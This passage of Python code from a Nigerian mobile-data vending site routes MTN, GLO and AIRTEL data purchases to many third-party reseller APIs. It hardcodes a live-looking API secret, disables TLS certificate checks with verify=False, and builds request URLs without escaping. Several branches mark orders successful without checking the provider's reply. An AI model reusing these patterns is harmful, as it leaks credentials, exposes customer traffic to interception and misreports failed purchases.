                url = "https://smeplug.ng/api/v1/data/purchase"
                payload = {"network_id": net,"plan_id":plan_id,"phone": num}
                payload = json.dumps(payload)

                headers = {
                    'Content-Type': 'application/json', 'User-Agent': 'Custom', 
                    'Authorization': f'Bearer {config.sme_plug_secret_key}'
                }
                response = requests.request("POST", url, headers=headers, data = payload)                
                try:
                    resp = json.loads(response.text)
                    if 'data' in resp and 'current_status' in resp['data'] and 'msg' in resp['data']:
                                if resp['data']['current_status'] == "success" or  resp['data']['current_status'] == "processing":
                                    return "successful"
                                else:
                                    return "failed"
                    else:
                        return "failed"
                except:
                        return "processing"

            def sendsmedata(shortcode,servercode,message,mytype):
                        payload={
                            'shortcode':shortcode,
                            'servercode': servercode,
                            'message':message,
                            'token': f"{config.simhost_API_key}",
                            'type':mytype
                        }

                        baseurl ='https://ussd.simhosting.ng/api/?'
                        response = requests.get(baseurl,params=payload,verify=False)
                        print(response.text)
                        print("###################################################")
                        print("hello this is simhosting")

            def senddata_ussdsimhost(ussd,servercode,mytype):
                     payload={
                         'ussd':ussd,
                         'servercode': servercode,
                             'token': f"{config.simhost_API_key}",
                         'type':mytype

                             }

                     baseurl ='https://ussd.simhosting.ng/api/ussd/?'
                     response = requests.get(baseurl,params=payload,verify=False)
                     #print(response.text)

            def senddata_simhostng(ussd,servercode,mytype,sim,msg=None):
                   #print('------------ simhostng.COM DATA RESPONSE -----------------')
                   if mytype == "SMS":
                       url = "https://simhostng.com/api/sms"
                       response = requests.post(f"{url}?apikey={config.simhost_API_key}&server={servercode}&sim={sim}&number={ussd}&message={msg}")
                       #print(response.text)
                   else:
                        url = "https://simhostng.com/api/ussd"
                        response = requests.post(f"{url}?apikey={config.simhost_API_key}&server={servercode}&sim={sim}&number={urllib.parse.quote(ussd)}")
                        #print(response.text)

            # def msorg_senddata(netid,num,plan_id):

            #             url = f"{config.msorg_web_url}/api/data/"

            #             headers = {
            #             'Content-Type':'application/json',
            #             'Authorization': f'Token {config.msorg_web_api_key}'
            #             }
            #             param = {"network": netid,"mobile_number": num,"plan": plan_id,"Ported_number":True}
            #             param_data = json.dumps(param)
            #             response = requests.post(url, headers=headers, data=param_data, verify=False)
            #             return response

            def msorg_senddata(website,token,netid,num,plan_id):
                url = f"{website}/api/data/"

                headers = {
                    'Content-Type':'application/json',
                    'Authorization': f'Token {token}'
                }
                param = {"network": netid,"mobile_number": num,"plan": plan_id,"Ported_number":True}
                param_data = json.dumps(param)
                response = requests.post(url, headers=headers, data=param_data, verify=False)

                if response.status_code == 200 or response.status_code == 201:
                    try:
                        result = json.loads(response.text)
                        
                        if 'Status' in result:
                            if result['Status'] == "failed":
                                return "failed"
                            else:
                                return "successful"

                        if 'error' in result:
                            return "failed"

                    except:
                        return "processing"
                        
                elif response.status_code == 400 or response.status_code == 401:
                      return "failed"
                else:
                      return "processing"

            def Msplug_Data_vending(net,plan,num,sim,rtype,device_id):
                    url = "https://www.msplug.com/api/buy-data/"
                    payload = {
                        "network":net,
                        "plan_id": plan,
                        "phone":num,
                        "device_id":device_id,
                        "sim_slot":sim,
                        "request_type":rtype,
                        "webhook_url":"http://www.yuniqtelecoms.com/buydata/webhook/"
                    }
                    headers = {
                    'Authorization': f'Token {config.msplug_API_key}',
                    'Content-Type': 'application/json'
                    }

                    response = requests.post(url, headers=headers, data = json.dumps(payload))
                    # #print('---------- sneding data to MSPLUG')
                    # #print(payload)
                    # #print(response.text)

            def VTUAUTO_Shortcode(shortcode,message,device_id,slot):
                    payload = {
                            "device_id":device_id,
                            "message":message,
                            "message_recipient":shortcode,
                            "sim":slot}
                    response = requests.post("https://vtuauto.ng/api/v1/request/sms", auth=HTTPBasicAuth(f'{config.vtu_auto_email}', f'{config.vtu_auto_password}'), data=payload)
                    #print(response.text)

            def VTUAUTO_USSD(ussd,device_id,sim):
                        payload = {
                                "device_id":device_id,
                                "ussd_string":ussd,
                                "sim":sim}
                        response = requests.post("https://vtuauto.ng/api/v1/request/ussd", auth=HTTPBasicAuth(f'{config.vtu_auto_email}', f'{config.vtu_auto_password}'), data=payload)
                        #print(response.text)

            def senddatasmeify(net,plan,num,validity):
                    headers = { 'Content-Type': 'application/json', 'User-Agent': 'Custom',  'Authorization': f'Bearer {SmeifyAuth.objects.first().get_token()}'}
                    url = "https://api.smeify.com/api/v2/data"
                    payload = json.dumps({
                      "phones": str(num),
                      "plan": plan
                    })
                    respons = requests.post(url, headers=headers, data=payload)
                    # headers = { 'Content-Type': 'application/json', 'User-Agent': 'Custom',  'Authorization': f'Bearer {SmeifyAuth.objects.first().get_token()}'}
                    # url =   f"https://auto.smeify.com/api/v1/online/data?network={net}&&volume={int(plan)}&&phone={num}&&plan={validity}"
                    # respons = requests.request("POST", url, headers=headers)
                    #print(respons.text)

            def ogdams_senddata(net,plan_id,num):
                    def create_id():
                            num = random.randint(1,10)
                            num_2 = random.randint(1,10)
                            num_3 = random.randint(1,10)
                            return str(num_2)+str(num_3)+str(uuid.uuid4())

                    ident = create_id()
                                                        
                    url = "https://ogdams.alwayskonnect.com/api/v1/vend/data"
                    payload = json.dumps({
                      "networkId": net,
                      "planId": plan_id,
                      "phoneNumber": num,
                      "reference": ident[:10]
                    })

                    headers = {
                      'Authorization': 'Bearer sk_live_790e759c-0999-43ad-ba43-59cff817cd24',
                      'Content-Type': 'application/json',
                      'Accept': 'application/json',
                    }

                    response = requests.request("POST", url, headers=headers, data = payload)
                    logging.error('------------------------------ TO OGDAMS')
                    logging.error(f'payload = {payload}')
                    logging.error(f'response = {response.text}')
                    
                    return 'successful'
                    

            if net == 'MTN':
                            mtn_text = SME_text.objects.get(network=Network.objects.get(name='MTN'))

                            if plan.plan_type == "GIFTING":
                                        provider_source = Network.objects.get(name=net).gifting_vending_medium

                                        if Network.objects.get(name=net).gifting_vending_medium == "SMEPLUG":
                                            resp = senddatasmeplug("1",plan.smeplug_id,num)
                                            status =  resp

                                        elif Network.objects.get(name=net).gifting_vending_medium == "EMAIL":
                                            sendmail("Order notification on yuniqtelecoms.com", f"{user.username} placed an order of {net} {plan.plan_size}{plan.plan_Volume}  DATA on {num}", f"{config.gmail}", f"ADMINISTRATOR")
                                            status = "processing"

                                        elif Network.objects.get(name=net).gifting_vending_medium =='SMEIFY':
                                                         senddatasmeify(net,plan.smeify_plan_name_id,num,plan.month_validate)
                                                         status = 'successful'

                                        elif Network.objects.get(name=net).gifting_vending_medium == "SMS FORWARDER":
                                            command = plan.ussd_string.replace("n",num).replace("p",mtn_text.pin)
                                            sendmessage('yuniqtelecoms', f"{mtn_text.text_to_search}{command}",f"{mtn_text.number}","02")
                                            status = 'successful'

                                        elif Network.objects.get(name=net).gifting_vending_medium == "QTopUp":
                                            url = f"https://sme.qtopup.com.ng/api/v1/data?api-token={config.qtopup_api_key}&network=MTNCG&phone={num}&amount={plan.qtopup_id}"
                                            headers = {
                                              'Content-Type': 'application/json'
                                            }
                                            response = requests.get(url, headers=headers)
                                            result = response.text

                                            #print('')
                                            #print('SENDING TO qtopup')
                                            #print('url = ', url)
                                            #print('result = ', result)

                                            Wallet_summary.objects.create(user= user, product="{} {}{}   N{}  DATA topup topup  with {} ".format(net,plan.plan_size,plan.plan_Volume, amount,num), amount = amount, previous_balance = previous_bal, after_balance= (previous_bal - amount))
                                            status = "successful"

                                        # elif Network.objects.get(name=net).gifting_vending_medium == "MSORG_DEVELOPED_WEBSITE":
                                        #           msorg_senddata(Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                                        #           status = "successful"
                                        elif Network.objects.get(name=net).gifting_vending_medium == "MSORG_DEVELOPED_WEBSITE":
                                            resp = msorg_senddata(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                                            status = resp

                                        elif Network.objects.get(name=net).gifting_vending_medium == "MSORG_DEVELOPED_WEBSITE_2":
                                            resp = msorg_senddata(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,plan.plan_name_id_2)
                                            status = resp
                                        
                                        elif Network.objects.get(name=net).gifting_vending_medium == "MSORG_DEVELOPED_WEBSITE_3":
                                            resp = msorg_senddata(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,plan.plan_name_id_3)
                                            status = resp

                                        elif Network.objects.get(name=net).gifting_vending_medium =='MSPLUG': 
                                            Msplug_Data_vending(net,plan.msplug_plan_name_id,num,mtn_text.msplug_sim_slot,"USSD",mtn_text.msplug_device_id)
                                            status = 'successful'

                                        elif Network.objects.get(name=net).gifting_vending_medium == "SIMHOST":

                                                    def sendussddata(ussd,num,servercode):
                                                        payload={
                                                            'ussd':ussd,
                                                            'servercode': servercode,
                                                            'multistep':num,
                                                            'token': f"{config.simhost_API_key}",
                                                           }

                                                        baseurl ="https://ussd.simhosting.ng/api/ussd/?"
                                                        response = requests.get(baseurl,params=payload,verify=False)
                                                        # print(response.text)

                                                    ussd =  plan.ussd_string
                                                    sendussddata(f"{ussd}",num,mtn_text.sim_host_server_id_for_data)
                                                    status = 'successful'

                                        elif Network.objects.get(name=net).gifting_vending_medium =='MSPLUG':
                                            if mtn_text.mtn_sme_route  == "SMS":
                                                Msplug_Data_vending(net,plan.msplug_plan_name_id,num,mtn_text.msplug_sim_slot,"SMS",mtn_text.msplug_device_id)
                                                status = 'successful'
                                                
                                            else:
                                                Msplug_Data_vending(net,plan.msplug_plan_name_id,num,mtn_text.msplug_sim_slot,"USSD",mtn_text.msplug_device_id)
                                                status = 'successful'


                                        elif Network.objects.get(name=net).gifting_vending_medium == "UWS":

                                            def create_id():
                                                    num = random.randint(1,10)
                                                    num_2 = random.randint(1,10)
                                                    num_3 = random.randint(1,10)
                                                    return str(num_2)+str(num_3)+str(uuid.uuid4())

                                            ident = create_id()

                                            while Data.objects.filter(ident= ident).exists():
                                                    ident = create_id()


                                            url = "https://api.uws.com.ng/api/v1/mtn_coperate_data/purchase"

                                            headers = {
                                                'Content-Type': 'application/json', 'User-Agent': 'Custom', 
                                                'Accept': 'application/json',
                                                'Authorization': f'Bearer {config.uws_token}'
                                            }
                                            payload = {"phone" : num, "plan_id" : str(plan.uws_plan_name_id), "customRef" : ident}

                                            response = requests.request("POST", url, headers=headers, data = json.dumps(payload))
                                            result = json.loads(response.text)
                                            # print(result)
                                            # print(response.status_code)

                                            if result['status'] == "success":
                                                status = 'successful'

                                            elif result['status'] == "failed":
                                                status = 'failed'

                                            else:
                                                status = 'processing'


                                        else:
                                                    try:
                                                        sendmessage('myweb',"{0} want to buy {1}{3}  M_TN data on {2} ".format(user.username,plan.plan_size,num,plan.plan_Volume),f"{config.sms_notification_number}","02")
                                                        status = 'successful'
                                                    except:
                                                            pass

                            elif plan.plan_type == "CORPORATE GIFTING":
                                        provider_source = Network.objects.get(name=net).corporate_data_vending_medium

                                        if Network.objects.get(name=net).corporate_data_vending_medium == "SMEPLUG":
                                            resp = senddatasmeplug("1",plan.smeplug_id,num)
                                            status = resp
                                        
                                        elif Network.objects.get(name=net).corporate_data_vending_medium == "EMAIL":
                                            sendmail("Order notification on yuniqtelecoms.com", f"{user.username} placed an order of {net} {plan.plan_size}{plan.plan_Volume}  DATA on {num}", f"{config.gmail}", f"ADMINISTRATOR")
                                            status = "processing"

                                        elif Network.objects.get(name=net).corporate_data_vending_medium =='SMEIFY':
                                                         senddatasmeify(net,plan.smeify_plan_name_id,num,plan.month_validate)
                                                         status = 'successful'

                                        elif Network.objects.get(name=net).corporate_data_vending_medium == "QTopUp":
                                            url = f"https://sme.qtopup.com.ng/api/v1/data?api-token={config.qtopup_api_key}&network=MTNCG&phone={num}&amount={plan.qtopup_id}"
                                            headers = {
                                              'Content-Type': 'application/json'
                                            }
                                            response = requests.get(url, headers=headers)
                                            result = response.text

                                            #print('')
                                            #print('SENDING TO qtopup')
                                            #print('url = ', url)
                                            #print('result = ', result)

                                            Wallet_summary.objects.create(user= user, product="{} {}{}   N{}  DATA topup topup  with {} ".format(net,plan.plan_size,plan.plan_Volume, amount,num), amount = amount, previous_balance = previous_bal, after_balance= (previous_bal - amount))
                                            status = "successful"

                                        # elif Network.objects.get(name=net).corporate_data_vending_medium == "MSORG_DEVELOPED_WEBSITE":
                                        #           msorg_senddata(Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                                        #           status = "successful"
                                        elif Network.objects.get(name=net).corporate_data_vending_medium == "MSORG_DEVELOPED_WEBSITE":
                                            resp = msorg_senddata(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                                            status = resp

                                        elif Network.objects.get(name=net).corporate_data_vending_medium == "MSORG_DEVELOPED_WEBSITE_2":
                                            resp = msorg_senddata(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,plan.plan_name_id_2)
                                            status = resp

                                        elif Network.objects.get(name=net).corporate_data_vending_medium == "MSORG_DEVELOPED_WEBSITE_3":
                                            resp = msorg_senddata(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,plan.plan_name_id_3)
                                            status = resp

                                        elif Network.objects.get(name=net).corporate_data_vending_medium == "SIMHOST":

                                                    def sendsmedata(ussd,num,servercode):
                                                        payload={
                                                            'ussd':ussd,
                                                            'servercode': servercode,
                                                            'multistep':num,
                                                            'token': f"{config.simhost_API_key}",
                                                           }

                                                        baseurl ="https://ussd.simhosting.ng/api/ussd/?"
                                                        response = requests.get(baseurl,params=payload,verify=False)
                                                        #print(response.text)

                                                    ussd =  plan.ussd_string
                                                    resp = senddata_ussdsimhost(f"{ussd}",num,mtn_text.sim_host_server_id_for_data)
                                                    
                                                    try:
                                                        result = json.loads(resp.text)
                                                        ident = result["log_id"]
                                                    except:
                                                        pass


                                                    status = 'successful'



                                        elif Network.objects.get(name=net).corporate_data_vending_medium == "UWS":

                                            def create_id():
                                                    num = random.randint(1,10)
                                                    num_2 = random.randint(1,10)
                                                    num_3 = random.randint(1,10)
                                                    return str(num_2)+str(num_3)+str(uuid.uuid4())

                                            ident = create_id()

                                            while Data.objects.filter(ident= ident).exists():
                                                    ident = create_id()


                                            url = "https://api.uws.com.ng/api/v1/mtn_coperate_data/purchase"

                                            headers = {
                                                'Content-Type': 'application/json', 'User-Agent': 'Custom', 
                                                'Accept': 'application/json',
                                                'Authorization': f'Bearer {config.uws_token}'
                                            }
                                            payload = {"phone" : num, "plan_id" : str(plan.uws_plan_name_id), "customRef" : ident}

                                            response = requests.request("POST", url, headers=headers, data = json.dumps(payload))
                                            result = json.loads(response.text)
                                            # print(result)
                                            # print(response.status_code)

                                            if result['status'] == "success":
                                                status = 'successful'

                                            elif result['status'] == "failed":
                                                status = 'failed'

                                            else:
                                                status = 'processing'

                                        else:
                                            try:
                                                sendmessage('myweb',"{0} want to buy {1}{3}  M_TN data on {2} ".format(user.username,plan.plan_size,num,plan.plan_Volume),f"{config.sms_notification_number}","02")
                                                status = 'successful'
                                            except:
                                                    pass

                            
                            else:
                                        provider_source = Network.objects.get(name=net).data_vending_medium

                                        if Network.objects.get(name=net).data_vending_medium ==  "SIMHOST":
                                            if plan.plan_type == "SME":
                                                    if mtn_text.mtn_sme_route  == "SMS":
                                                        command =  plan.sms_command.replace("n",num).replace("p",mtn_text.pin)
                                                        sendsmedata("131",mtn_text.sim_host_server_id_for_data,f'{command}','SHORTCODE')
                                                        status = 'successful'
                                                    else:
                                                        ussd =  plan.ussd_string.replace("n",num).replace("p",mtn_text.pin)
                                                        senddata_ussdsimhost(f"{ussd}",mtn_text.sim_host_server_id_for_data,'USSD')
                                                        status = 'successful'
                                            else:
                                                sendmessage('myweb',"{0} want to buy {1}{3}  M_TN data on {2} ".format(user.username,plan.plan_size,num,plan.plan_Volume),mtn_text.number,"02")

                                        elif Network.objects.get(name=net).data_vending_medium == "SMS FORWARDER":
                                            command = plan.ussd_string.replace("n",num).replace("p",mtn_text.pin)
                                            sendmessage('yuniqtelecoms', f"{mtn_text.text_to_search}{command}",f"{mtn_text.number}","02")
                                            status = 'successful'
                                            
                                        elif Network.objects.get(name=net).data_vending_medium == "OGDAMS":
                                            resp = ogdams_senddata("1",plan.ogdams_plan_id,num)
                                            status = resp

                                        elif Network.objects.get(name=net).data_vending_medium == "EMAIL":
                                            sendmail("Order notification on yuniqtelecoms.com", f"{user.username} placed an order of {net} {plan.plan_size}{plan.plan_Volume}  DATA on {num}", f"{config.gmail}", f"ADMINISTRATOR")
                                            status = "processing"

                                        elif Network.objects.get(name=net).data_vending_medium ==  "SIMHOST_NG":
                                                    if plan.plan_type == "SME":
                                                            if mtn_text.mtn_sme_route  == "SMS":
                                                                command =  plan.sms_command.replace("n",num).replace("p",mtn_text.pin)
                                                                senddata_simhostng("131",mtn_text.sim_host_server_id_for_data,"SMS",mtn_text.vtu_sim_slot,f'{command}')  ## simcard.ng
                                                                status = 'successful'
                                                            else:
                                                                ussd =  plan.ussd_string.replace("n",num).replace("p",mtn_text.pin)
                                                                senddata_simhostng(f"{ussd}",mtn_text.sim_host_server_id_for_data,"USSD",mtn_text.vtu_sim_slot)
                                                                status = 'successful'
                                                    else:
                                                        sendmessage('myweb',"{0} want to buy {1}{3}  M_TN data on {2} ".format(user.username,plan.plan_size,num,plan.plan_Volume),mtn_text.number,"02")

                                        elif Network.objects.get(name=net).data_vending_medium == "UWS":

                                                def create_id():
                                                        num = random.randint(1,10)
                                                        num_2 = random.randint(1,10)
                                                        num_3 = random.randint(1,10)
                                                        return str(num_2)+str(num_3)+str(uuid.uuid4())

                                                ident = create_id()

                                                while Data.objects.filter(ident= ident).exists():
                                                        ident = create_id()


                                                url = "https://api.uws.com.ng/api/v1/sme_data/purchase"

                                                payload = {
                                                    "phone" : num,
                                                    "network_id" : "2",
                                                    "plan_id" : str(plan.uws_plan_name_id),
                                                    "customRef" : ident
                                                }

                                                headers = {
                                                    'Content-Type': 'application/json', 'User-Agent': 'Custom', 
                                                    'Accept': 'application/json',
                                                    'Authorization': f'Bearer {config.uws_token}'
                                                }

                                                response = requests.request("POST", url, headers=headers, data = json.dumps(payload))
                                                result = json.loads(response.text)
                                                # print(result)
                                                # print(response.status_code)

                                                if result['status'] == "success":
                                                    status = 'successful'

                                                elif result['status'] == "failed":
                                                    status = 'failed'

                                                else:
                                                    status = 'processing'

                                        elif Network.objects.get(name=net).data_vending_medium =='SMEPLUG':
                                            resp = senddatasmeplug("1",plan.smeplug_id,num)
                                            status = resp

                                        elif Network.objects.get(name=net).data_vending_medium =='SMS':
                                                sendmessage('myweb', "{0} want to buy {1}{3}  M_TN data on {2} ".format(user.username, plan.plan_size, num, plan.plan_Volume),f"{config.sms_notification_number}", "02")

                                        # elif Network.objects.get(name=net).data_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                                        #           msorg_senddata(Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                                        #           status = "successful"

                                        elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE":
                                            resp = msorg_senddata(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                                            status = resp

                                        elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE_2":
                                            resp = msorg_senddata(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,plan.plan_name_id_2)
                                            status = resp

                                        elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE_3":
                                            resp = msorg_senddata(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,plan.plan_name_id_3)
                                            status = resp

                                        elif Network.objects.get(name=net).data_vending_medium =='VTUAUTO':

                                                if mtn_text.mtn_sme_route  == "SMS":
                                                        command =  plan.sms_command.replace("n",num).replace("p",mtn_text.pin)
                                                        VTUAUTO_Shortcode("131",f'{command}',mtn_text.vtu_auto_device_id ,mtn_text.vtu_sim_slot)

                                                        status = 'successful'
                                                else:
                                                        ussd =  plan.ussd_string.replace("n",num).replace("p",mtn_text.pin)
                                                        VTUAUTO_USSD(f"{ussd}",mtn_text.vtu_auto_device_id, mtn_text.vtu_sim_slot)
                                                        status = 'successful'

                                        elif Network.objects.get(name=net).data_vending_medium =='MSPLUG':
                                            if mtn_text.mtn_sme_route  == "SMS":
                                                    Msplug_Data_vending(net,plan.msplug_plan_name_id,num,mtn_text.msplug_sim_slot,"SMS",mtn_text.msplug_device_id)
                                                    status = 'successful'
                                            else:
                                                    Msplug_Data_vending(net,plan.msplug_plan_name_id,num,mtn_text.msplug_sim_slot,"USSD",mtn_text.msplug_device_id)
                                                    status = 'successful'


                                        elif Network.objects.get(name=net).data_vending_medium =='SMEIFY':
                                                         senddatasmeify(net,plan.smeify_plan_name_id,num,plan.month_validate)
                                                         status = 'successful'

            elif net == 'GLO':
                            provider_source = Network.objects.get(name=net).data_vending_medium

                            glo_text = SME_text.objects.get(network=Network.objects.get(name='GLO'))
                            try:
                                ussd = plan.ussd_string.replace("p",num)
                            except:
                                ussd = ''

                            if Network.objects.get(name=net).data_vending_medium ==  "SIMHOST":
                                senddata_ussdsimhost(f"{ussd}",glo_text.sim_host_server_id_for_data,'USSD')
                                status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium == "EMAIL":
                                sendmail("Order notification on yuniqtelecoms.com", f"{user.username} placed an order of {net} {plan.plan_size}{plan.plan_Volume}  DATA on {num}", f"{config.gmail}", f"ADMINISTRATOR")
                                status = "processing"

                            elif Network.objects.get(name=net).data_vending_medium ==  "SIMHOST_NG":
                                senddata_simhostng(f"{ussd}",glo_text.sim_host_server_id_for_data,"USSD",glo_text.vtu_sim_slot)
                                status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium == "SMS FORWARDER":
                                command = ussd
                                sendmessage('yuniqtelecoms', f"{glo_text.text_to_search}{command}",f"{glo_text.number}","02")
                                status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium =='SMEPLUG':
                                    resp = senddatasmeplug("4",plan.smeplug_id,num)
                                    status = resp


                            # elif Network.objects.get(name=net).data_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                            #             msorg_senddata(Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                            #             status = "successful"

                            elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE":
                                resp = msorg_senddata(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                                status = resp

                            elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE_2":
                                resp = msorg_senddata(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,plan.plan_name_id_2)
                                status = resp

                            elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE_3":
                                resp = msorg_senddata(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,plan.plan_name_id_3)
                                status = resp


                            elif Network.objects.get(name=net).data_vending_medium =='SMS':
                                    sendmessage('myweb', "{0} want to buy {1}{3}  GLO-DATA data on {2} ".format(user.username, plan.plan_size, num, plan.plan_Volume), f"{config.sms_notification_number}", "02")

                            elif Network.objects.get(name=net).data_vending_medium =='VTUAUTO':
                                         VTUAUTO_USSD(f"{ussd}",glo_text.vtu_auto_device_id, glo_text.vtu_sim_slot)
                                         status = 'successful'



                            elif Network.objects.get(name=net).data_vending_medium =='MSPLUG':
                                Msplug_Data_vending(net,plan.msplug_plan_name_id,num,glo_text.msplug_sim_slot,"USSD",glo_text.msplug_device_id)
                                status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium =='SMEIFY':
                                            senddatasmeify(net,plan.smeify_plan_name_id,num,plan.month_validate)
                                            status = 'successful'

            elif net == 'AIRTEL':
                provider_source = Network.objects.get(name=net).data_vending_medium

                airtel_text = SME_text.objects.get(network=Network.objects.get(name='AIRTEL'))
                try:
                    ussd = plan.ussd_string.replace("n",num).replace("p",airtel_text.pin)
                except:
                    ussd = ''

                if plan.plan_type == "CORPORATE GIFTING":
                    if Network.objects.get(name=net).corporate_data_vending_medium == "UWS":
                            def create_id():
                                num = random.randint(1,10)
                                num_2 = random.randint(1,10)
                                num_3 = random.randint(1,10)
                                return str(num_2)+str(num_3)+str(uuid.uuid4())

                            ident = create_id()

                            while Data.objects.filter(ident= ident).exists():
                                    ident = create_id()

                            url = "https://api.uws.com.ng/api/v1/airtel_coperate_data/purchase"

                            headers = {
                                'Content-Type': 'application/json',
                                'Accept': 'application/json',
                                'Authorization': f'Bearer {config.uws_token}'
                            }
                            payload = {"phone" : num, "plan_id" : str(plan.uws_plan_name_id), "customRef" : ident}
                            
                            response = requests.request("POST", url, headers=headers, data = json.dumps(payload)) 
                            result = json.loads(response.text) 
                            
                            if result['status'] == "success":
                                status = 'successful'
                            elif result['status'] == "failed":
                                status = 'failed'
                            else:
                                status = 'processing'

                    elif Network.objects.get(name=net).corporate_data_vending_medium == "CHEAPESTDATASUB":
                        url = "https://cheapestsub.com/account/api/v1/buyairtelcg"

                        payload = json.dumps({
                          "bundle": f"{int(plan.plan_size)}{plan.plan_Volume}",
                          "mobile": str(num)
                        })
                        headers = {
                          'Content-Type': 'application/json', 
                        }

                        response = requests.post(url, headers=headers, data=payload, auth=HTTPBasicAuth('username','password') ) 
                        zz = json.loads(response.text)

                        if 'status' in zz:
                            if zz['status'] == "success":
                                status = "successful"
                            else:
                                status = "failed"
                        else:
                            status = "failed"

                
                    elif Network.objects.get(name=net).corporate_data_vending_medium == "MSORG_DEVELOPED_WEBSITE":
                        resp = msorg_senddata(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                        status = resp

                    elif Network.objects.get(name=net).corporate_data_vending_medium == "MSORG_DEVELOPED_WEBSITE_2":
                        resp = msorg_senddata(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,plan.plan_name_id_2)
                        status = resp
                    
                    elif Network.objects.get(name=net).corporate_data_vending_medium == "MSORG_DEVELOPED_WEBSITE_3":
                        resp = msorg_senddata(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,plan.plan_name_id_3)
                        status = resp
                        
                else:
                            

                            if Network.objects.get(name=net).data_vending_medium ==  "SIMHOST":
                                senddata_ussdsimhost(f"{ussd}",airtel_text.sim_host_server_id_for_data,'USSD')
                                senddata_ussdsimhost("*123#".format(num),airtel_text.sim_host_server_id_for_data,'USSD')
                                status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium ==  "SIMHOST_NG":
                                senddata_simhostng(f"{ussd}",airtel_text.sim_host_server_id_for_data,"USSD",airtel_text.vtu_sim_slot)
                                status = 'successful'
                                
                            elif Network.objects.get(name=net).data_vending_medium == "OGDAMS":
                                resp = ogdams_senddata("2",plan.ogdams_plan_id,num)
                                status = resp

                            elif Network.objects.get(name=net).data_vending_medium == "EMAIL":
                                sendmail("Order notification on yuniqtelecoms.com", f"{user.username} placed an order of {net} {plan.plan_size}{plan.plan_Volume}  DATA on {num}", f"{config.gmail}", f"ADMINISTRATOR")
                                status = "processing"

                            elif Network.objects.get(name=net).data_vending_medium == "SMS FORWARDER":
                                command = ussd
                                sendmessage('yuniqtelecoms', f"{airtel_text.text_to_search}{command}",f"{airtel_text.number}","02")
                                status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium =='SMEPLUG':
                                    resp = senddatasmeplug("2",plan.smeplug_id,num)
                                    status = resp

                            elif Network.objects.get(name=net).data_vending_medium == "UWS":
                                    # print('--------------------------------- AIRTEL DATA TO UWS')
                                    def create_id():
                                            num = random.randint(1,10)
                                            num_2 = random.randint(1,10)
                                            num_3 = random.randint(1,10)
                                            return str(num_2)+str(num_3)+str(uuid.uuid4())

                                    ident = create_id()

                                    while Data.objects.filter(ident= ident).exists():
                                            ident = create_id()


                                    url = "https://api.uws.com.ng/api/v1/sme_data/purchase"

                                    payload = {
                                        "phone" : num,
                                        "network_id" : "1",
                                        "plan_id" : str(plan.uws_plan_name_id),
                                        "customRef" : ident
                                    }

                                    headers = {
                                        'Content-Type': 'application/json', 'User-Agent': 'Custom', 
                                        'Accept': 'application/json',
                                        'Authorization': f'Bearer {config.uws_token}'
                                    }

                                    response = requests.request("POST", url, headers=headers, data = json.dumps(payload))
                                    result = json.loads(response.text)
                                    # print(payload)
                                    # print(response.text)
                                    # print(response.status_code)
                                    status = 'successful'
                                    try:
                                        if result['status'] == "failed":
                                            status = 'failed'
                                    except:
                                        pass


                            elif Network.objects.get(name=net).data_vending_medium =='SMS':
                                    sendmessage('myweb', "{0} want to buy {1}{3}  AIRTEL-DATA data on {2} ".format(user.username, plan.plan_size, num, plan.plan_Volume), f"{config.sms_notification_number}", "02")

                            # elif Network.objects.get(name=net).data_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                            #             msorg_senddata(Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                            #             status = "successful"
                            elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE":
                                resp = msorg_senddata(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                                status = resp

                            elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE_2":
                                resp = msorg_senddata(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,plan.plan_name_id_2)
                                status = resp
